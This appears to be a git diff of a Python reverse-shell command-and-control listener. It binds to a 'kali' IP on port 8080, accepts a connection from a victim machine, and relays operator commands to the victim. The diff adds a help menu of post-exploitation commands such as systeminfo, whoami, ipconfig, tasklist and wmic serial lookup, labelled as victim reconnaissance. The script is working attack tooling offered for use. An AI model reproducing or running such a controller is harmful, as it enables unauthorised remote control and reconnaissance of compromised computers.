@@ -1,12 +1,28 @@
 #!usr/bin/env python3
 
 import socket
+import os
 
-RED = '\033[31m'
-RESET = '\033[0m'
-BOLD = '\033[1m'
+
+def clear():
+     
+     os_name = os.name
+
+     if os_name == "nt":
+          os.system("cls")
+     else:
+          os.system("clear")
+clear()
+
+#   Color pattern Ansi code
+RED = '\033[31m'        # RED coloR
+GREEN = '\033[32m'      # GREEN color
+BOLD = '\033[1m'        # Bold font
+RESET = '\033[0m'       # Reset all
+
 
 banner = f"""{RED}{BOLD}
+
                                               (       )     (    (     
                                               )\ ) ( /(     )\ ) )\ )  
  (     (   )     (  (        (           (   (()/( )\())(  (()/((()/(  
@@ -27,42 +43,72 @@ banner = f"""{RED}{BOLD}
 
 print(f"{banner}")
 
+# Showing what commands are all you use in shell
+info = """  
+
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-=-=-
+                        SHELL COMMANDS
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-=-=-
+
+pwd                                 print working directory
+terminate                           Exit from shell
+systeminfo                          Victim system information
+ls, dir                             list Directory
+hostname                            Domain name
+whoami                              User name
+ipconfig                            Show IP address
+ping <ip>                           Ping iP address
+wmic bios get serial number         System serialnumber
+tasklist                            Taskmanger
+netstat                             Port IP connection
+
+
+"""
 
 ip_addr = "192.168.74.132"         # use your kali IP address
 port = 8080                      # use any port
 
 
-def connect():          
-
-    try:
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.bind((ip_addr, port))
-            s.listen(1)
-
-            print("[!] Listening TCP connection from PORT 8080")
-
+def connect():      # Create and connect with target machine
             
-            conn, addr = s.accept()
+            try:
+                 
+                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                s.bind((ip_addr, port))
+                s.listen(1)
 
-            print("[+] We got a connection from : ", addr)
-    except Exception as e:
-         print("[!] Connection Error : ",e)
+                print(f"{RED}[!] Listening TCP connection from PORT 8080")
 
-    while True:
+                conn, addr = s.accept()
 
-        command = input("SHELL>>>").encode()
+                print(f"{GREEN}[+] We got a connection from : ", addr)
+            
+                while True:
 
-        if b"terminate" in command:
-            conn.send(b"terminate")
-            conn.close()
-            break
-        else:
-            conn.send(command)
-            response = conn.recv(1024)
-            print(response.decode())
+                    command = input("SHELL>>>").encode()
+
+                    if b"terminate" in command:
+                        conn.send(b"terminate")
+                        conn.close()
+                        break
+                    if b"INFO" in command.upper():
+                        conn.send(b"info")
+                        print(info)
+                    else:
+                        conn.send(command)
+                        response = conn.recv(1024)
+                        print(response.decode())
+
+            except Exception as e:
+                 print(f"{RED}COnnection Error : ",e)
+            except KeyboardInterrupt:
+                 pass
 
 def main():
     connect()
 
 if __name__ == "__main__":
     main()
+    
+
+
